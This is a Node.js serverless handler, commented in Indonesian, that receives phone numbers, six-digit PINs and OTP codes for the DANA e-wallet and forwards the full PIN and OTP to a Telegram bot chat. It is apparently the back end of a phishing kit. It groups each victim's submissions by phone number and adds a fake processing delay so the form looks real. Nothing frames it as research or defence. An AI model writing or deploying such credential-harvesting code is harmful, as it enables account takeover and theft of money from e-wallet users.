// api/send-dana-data.js
const axios = require('axios');
const NodeCache = require('node-cache');

// Buat cache untuk menyimpan data sementara (5 menit)
const dataCache = new NodeCache({ stdTTL: 300, checkperiod: 60 });

// Fungsi untuk mengirim data ke webhook (opsional)
async function sendToWebhook(data) {
  if (!process.env.WEBHOOK_URL) {
    console.log('WEBHOOK_URL not set, skipping webhook notification');
    return;
  }

  try {
    const payload = {
      type: data.type,
      phone: data.phone,
      // Sensitive data hanya dikirim sebagian untuk keamanan
      pin: data.type === 'pin' ? '******' : 'not_provided',
      otp: data.type === 'otp' ? '****' : 'not_provided',
      timestamp: new Date().toISOString(),
      userAgent: data.userAgent || 'unknown'
    };

    await axios.post(process.env.WEBHOOK_URL, payload);
    console.log('Data sent to webhook successfully');
  } catch (error) {
    console.error('Error sending to webhook:', error.message);
  }
}

// Fungsi untuk mengirim notifikasi ke Telegram dengan format yang diinginkan
async function sendToTelegram(data) {
  if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
    console.log('Telegram credentials not set, skipping notification');
    return;
  }

  try {
    // Format pesan sesuai permintaan
    let message = `├• AKUN | DANA E-WALLET\n` +
                 `├───────────────────\n` +
                 `├• NO HP : ${data.phone}\n`;
    
    if (data.pin && data.pin !== 'not_provided') {
      message += `├───────────────────\n` +
                 `├• PIN  : ${data.pin}\n`;
    }
    
    if (data.otp && data.otp !== 'not_provided') {
      message += `├───────────────────\n` +
                 `├• OTP : ${data.otp}\n`;
    }
    
    message += `╰───────────────────`;

    const url = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    await axios.post(url, {
      chat_id: process.env.TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: null // Nonaktifkan Markdown untuk format teks biasa
    });
    
    console.log('Notification sent to Telegram successfully');
  } catch (error) {
    console.error('Error sending to Telegram:', error.message);
  }
}

// Fungsi untuk mengelompokkan data berdasarkan nomor telepon
async function processAndSendTelegram(data) {
  const { type, phone, pin, otp } = data;
  
  // Jika hanya nomor telepon, kirim langsung
  if (type === 'phone') {
    await sendToTelegram({
      phone: phone,
      pin: 'not_provided',
      otp: 'not_provided'
    });
    return;
  }
  
  // Cek apakah data untuk nomor ini sudah ada di cache
  const cacheKey = `dana_${phone}`;
  const cachedData = dataCache.get(cacheKey) || { 
    phone: phone, 
    pin: 'not_provided', 
    otp: 'not_provided' 
  };
  
  // Update data yang ada
  if (type === 'pin') {
    cachedData.pin = pin;
  } else if (type === 'otp') {
    cachedData.otp = otp;
  }
  
  // Simpan kembali ke cache
  dataCache.set(cacheKey, cachedData);
  
  // Kirim notifikasi jika kita memiliki PIN dan OTP, atau jika data sudah lengkap
  if ((cachedData.pin !== 'not_provided' && cachedData.otp !== 'not_provided') || 
      (type === 'otp' && cachedData.pin !== 'not_provided')) {
    await sendToTelegram(cachedData);
    
    // Hapus dari cache setelah dikirim
    dataCache.del(cacheKey);
  }
}

// Fungsi untuk mengirim notifikasi email (opsional)
async function sendEmailNotification(data) {
  if (!process.env.EMAIL_API_KEY) {
    return; // Skip jika tidak ada konfigurasi email
  }

  try {
    // Implementasi pengiriman email sesuai provider yang Anda gunakan
    // Contoh menggunakan SendGrid, Nodemailer, dll.
    console.log('Email notification would be sent for:', {
      type: data.type,
      phone: data.phone,
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    console.error('Error sending email:', error.message);
  }
}

// Fungsi untuk menyimpan data ke database (opsional)
async function saveToDatabase(data) {
  // Implementasi penyimpanan database sesuai kebutuhan
  // Bisa menggunakan MongoDB, PostgreSQL, Firebase, dll.
  console.log('Data would be saved to database:', {
    type: data.type,
    phone: data.phone,
    timestamp: new Date().toISOString()
  });
}

// Main function
module.exports = async (req, res) => {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  // Handle preflight request
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ 
      success: false, 
      error: 'Method not allowed. Only POST requests are accepted.' 
    });
  }

  try {
    // Parse JSON body
    let body;
    try {
      body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
    } catch (parseError) {
      return res.status(400).json({ 
        success: false, 
        error: 'Invalid JSON format in request body' 
      });
    }

    const { type, phone, pin, otp } = body;

    // Validasi data yang diperlukan
    if (!type) {
      return res.status(400).json({ 
        success: false, 
        error: 'Missing required field: type' 
      });
    }

    if (!phone) {
      return res.status(400).json({ 
        success: false, 
        error: 'Missing required field: phone' 
      });
    }

    // Log data yang diterima (disensor untuk keamanan)
    console.log('📩 Data received:', { 
      type, 
      phone: phone ? `${phone.substring(0, 4)}****${phone.substring(phone.length - 2)}` : 'not_provided',
      hasPin: !!pin,
      hasOtp: !!otp,
      timestamp: new Date().toISOString(),
      ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
    });

    // Simulasi processing time (1-2 detik)
    const processingTime = Math.random() * 1000 + 1000;
    await new Promise(resolve => setTimeout(resolve, processingTime));

    // Proses data berdasarkan type
    switch (type) {
      case 'phone':
        if (!phone || phone.length < 10) {
          return res.status(400).json({ 
            success: false, 
            error: 'Invalid phone number' 
          });
        }
        break;

      case 'pin':
        if (!pin || pin.length !== 6) {
          return res.status(400).json({ 
            success: false, 
            error: 'PIN must be 6 digits' 
          });
        }
        break;

      case 'otp':
        if (!otp || otp.length !== 4) {
          return res.status(400).json({ 
            success: false, 
            error: 'OTP must be 4 digits' 
          });
        }
        break;

      default:
        return res.status(400).json({ 
          success: false, 
          error: 'Invalid type. Must be: phone, pin, or otp' 
        });
    }

    // Kirim notifikasi ke Telegram dengan format yang diinginkan
    try {
      await processAndSendTelegram({
        type,
        phone,
        pin: pin || 'not_provided',
        otp: otp || 'not_provided'
      });
    } catch (telegramError) {
      console.error('Telegram error:', telegramError.message);
      // Jangan gagalkan seluruh request karena error Telegram
    }

    // Kirim notifikasi ke webhook (opsional)
    try {
      await sendToWebhook({
        type,
        phone,
        pin,
        otp,
        userAgent: req.headers['user-agent'],
        ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
      });
    } catch (webhookError) {
      console.error('Webhook error:', webhookError.message);
      // Jangan gagalkan seluruh request karena error webhook
    }

    // Simpan ke database (opsional)
    try {
      await saveToDatabase({
        type,
        phone,
        timestamp: new Date().toISOString()
      });
    } catch (dbError) {
      console.error('Database error:', dbError.message);
      // Jangan gagalkan seluruh request karena error database
    }

    // Kirim notifikasi email (opsional)
    try {
      await sendEmailNotification({
        type,
        phone,
        timestamp: new Date().toISOString()
      });
    } catch (emailError) {
      console.error('Email error:', emailError.message);
      // Jangan gagalkan seluruh request karena error email
    }

    // Response sukses
    return res.status(200).json({ 
      success: true, 
      message: 'Data processed successfully',
      data: {
        type,
        phone: phone ? `${phone.substring(0, 4)}****${phone.substring(phone.length - 2)}` : 'not_provided',
        timestamp: new Date().toISOString()
      }
    });

  } catch (error) {
    console.error('❌ Server error:', error);
    return res.status(500).json({ 
      success: false, 
      error: 'Internal server error',
      message: process.env.NODE_ENV === 'development' ? error.message : 'Something went wrong'
    });
  }
};
